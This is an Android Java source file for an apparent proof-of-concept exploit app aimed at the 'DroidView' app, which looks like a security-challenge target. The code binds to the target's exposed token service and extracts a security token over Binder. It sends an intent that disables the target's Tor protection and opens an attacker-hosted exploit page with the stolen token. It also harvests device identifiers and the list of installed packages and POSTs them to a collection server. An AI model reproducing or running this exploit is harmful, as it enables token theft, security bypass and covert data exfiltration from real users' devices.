package com.nasr.droidviewpoc;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Parcel;
import android.os.RemoteException;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;



public class MainActivity extends AppCompatActivity {
    private static final String TAG = "DroidViewPOC";
    private static final String TARGET_PACKAGE = "com.eightksec.droidview";
    private static final String SERVICE_ACTION1 = "com.eightksec.droidview.ITokenService";
    private static final String SERVICE_ACTION2 = "com.eightksec.droidview.TOKEN_SERVICE";
    private static final int TRANSACTION_getSecurityToken = 1;
    private static final String DESCRIPTOR = "com.eightksec.droidview.ITokenService";
    private static final String SERVER_URL = "http://192.168.1.105:8080/collect"; // غيّر IP

    private String token = null;
    private final CountDownLatch latch = new CountDownLatch(1);
    private boolean bound = false;
    private Handler handler = new Handler(Looper.getMainLooper());
    private ExecutorService executor = Executors.newSingleThreadExecutor();

    private final ServiceConnection connection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            Log.i(TAG, "Service connected, attempting to get token via Binder transact...");
            token = getTokenViaBinder(service);
            latch.countDown();
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            Log.w(TAG, "Service disconnected");
            bound = false;
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        if (!isPackageInstalled(TARGET_PACKAGE)) {
            Toast.makeText(this, "DroidView is not installed!", Toast.LENGTH_LONG).show();
            finish();
            return;
        }

        launchTargetApp();
        handler.postDelayed(this::bindToTokenService, 2000);
    }

    private void launchTargetApp() {
        try {
            Intent intent = new Intent();
            intent.setComponent(new ComponentName(TARGET_PACKAGE, "com.eightksec.droidview.MainActivity"));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            Log.i(TAG, "Launched target app");
        } catch (Exception e) {
            Log.e(TAG, "Could not launch target app", e);
        }
    }

    private void bindToTokenService() {
        Log.i(TAG, "Attempting to bind to TokenService...");

        Intent startIntent = new Intent(SERVICE_ACTION1);
        startIntent.setPackage(TARGET_PACKAGE);
        try {
            ComponentName cn = startService(startIntent);
            Log.i(TAG, "startService result: " + (cn != null ? cn.flattenToString() : "null"));
        } catch (Exception e) {
            Log.e(TAG, "startService failed: " + e.getMessage());
        }

        Intent bindIntent = new Intent(SERVICE_ACTION1);
        bindIntent.setPackage(TARGET_PACKAGE);
        bound = bindService(bindIntent, connection, Context.BIND_AUTO_CREATE);

        if (!bound) {
            Log.w(TAG, "Bind with action1 failed, trying action2...");
            bindIntent = new Intent(SERVICE_ACTION2);
            bindIntent.setPackage(TARGET_PACKAGE);
            bound = bindService(bindIntent, connection, Context.BIND_AUTO_CREATE);
        }

        if (!bound) {
            Log.e(TAG, "Could not bind to TokenService with any action");
            Toast.makeText(this, "Could not connect to TokenService", Toast.LENGTH_LONG).show();
            finish();
            return;
        }

        Log.i(TAG, "Bind successful, waiting for token...");

        new Thread(() -> {
            try {
                if (!latch.await(10, TimeUnit.SECONDS)) {
                    runOnUiThread(() -> Toast.makeText(this, "Timeout getting token", Toast.LENGTH_SHORT).show());
                    Log.e(TAG, "Timeout waiting for token");
                    finish();
                    return;
                }
            } catch (InterruptedException e) {
                Log.e(TAG, "Latch interrupted", e);
                return;
            }

            runOnUiThread(() -> {
                if (token != null && !token.isEmpty()) {
                    Log.i(TAG, "Token received: " + token);

                    executor.execute(() -> {
                        try {
                            JSONObject deviceInfo = collectDeviceInfo();
                            sendDataToServer(deviceInfo);
                        } catch (Exception e) {
                            Log.e(TAG, "Error in background task", e);
                        }
                    });

                    disableTorSecurity();
                    handler.postDelayed(this::launchDroidViewWithExploit, 1500);
                } else {
                    Log.e(TAG, "Token is null or empty");
                    Toast.makeText(this, "Failed to get token", Toast.LENGTH_SHORT).show();
                }
                handler.postDelayed(this::finish, 5000);
            });
        }).start();
    }

    private String getTokenViaBinder(IBinder binder) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        String result = null;
        try {
            data.writeInterfaceToken(DESCRIPTOR);
            binder.transact(TRANSACTION_getSecurityToken, data, reply, 0);
            reply.readException();
            result = reply.readString();
            Log.d(TAG, "Binder result: " + result);
        } catch (RemoteException e) {
            Log.e(TAG, "Binder transact failed", e);
        } finally {
            data.recycle();
            reply.recycle();
        }
        return result;
    }

    private boolean isPackageInstalled(String packageName) {
        PackageManager pm = getPackageManager();
        try {
            pm.getPackageInfo(packageName, PackageManager.GET_ACTIVITIES);
            return true;
        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }

    private void disableTorSecurity() {
        try {
            Intent intent = new Intent("com.eightksec.droidview.TOGGLE_SECURITY");
            intent.setPackage(TARGET_PACKAGE);
            intent.putExtra("enable_security", false);
            intent.putExtra("security_token", token);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
            startActivity(intent);
            Log.i(TAG, "Sent intent to disable Tor security");
        } catch (Exception e) {
            Log.e(TAG, "Failed to send disable intent", e);
        }
    }

    private void launchDroidViewWithExploit() {
        try {
            String encodedToken = URLEncoder.encode(token, "UTF-8");
            String url = "http://192.168.1.105:8080/exploit.html?token=" + encodedToken; // غير IP
            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            intent.setPackage(TARGET_PACKAGE);
            startActivity(intent);
            Log.i(TAG, "Launched DroidView with exploit URL: " + url);
        } catch (Exception e) {
            Log.e(TAG, "Error launching DroidView", e);
            Toast.makeText(this, "Error: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }

    private JSONObject collectDeviceInfo() {
        JSONObject info = new JSONObject();
        try {
            Log.d(TAG, "Collecting device info...");

            info.put("manufacturer", Build.MANUFACTURER);
            info.put("model", Build.MODEL);
            info.put("device", Build.DEVICE);
            info.put("product", Build.PRODUCT);
            info.put("brand", Build.BRAND);
            info.put("board", Build.BOARD);
            info.put("hardware", Build.HARDWARE);
            try {
                info.put("serial", Build.getSerial());
            } catch (SecurityException e) {
                info.put("serial", "unknown (no permission)");
            }
            info.put("android_id", Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
            info.put("os_version", Build.VERSION.RELEASE);
            info.put("sdk_int", Build.VERSION.SDK_INT);
            info.put("language", getResources().getConfiguration().locale.getLanguage());
            info.put("country", getResources().getConfiguration().locale.getCountry());

            PackageManager pm = getPackageManager();
            List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
            JSONArray packagesArray = new JSONArray();
            for (ApplicationInfo appInfo : apps) {
                packagesArray.put(appInfo.packageName);
            }
            info.put("installed_packages", packagesArray);

            Log.d(TAG, "Collected " + packagesArray.length() + " packages");
        } catch (Exception e) {
            Log.e(TAG, "Error in collectDeviceInfo", e);
        }
        return info;
    }

    private void sendDataToServer(JSONObject data) {
        Log.d(TAG, "Preparing to send data to " + SERVER_URL);
        try {
            URL url = new URL(SERVER_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
            conn.setDoOutput(true);
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);

            String jsonString = data.toString();
            Log.d(TAG, "JSON payload: " + jsonString);

            OutputStream os = conn.getOutputStream();
            os.write(jsonString.getBytes("UTF-8"));
            os.flush();
            os.close();

            int responseCode = conn.getResponseCode();
            Log.i(TAG, "Server response code: " + responseCode);
            conn.disconnect();
        } catch (Exception e) {
            Log.e(TAG, "Failed to send data to server", e);
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (bound) {
            unbindService(connection);
            bound = false;
        }
        executor.shutdown();
    }
}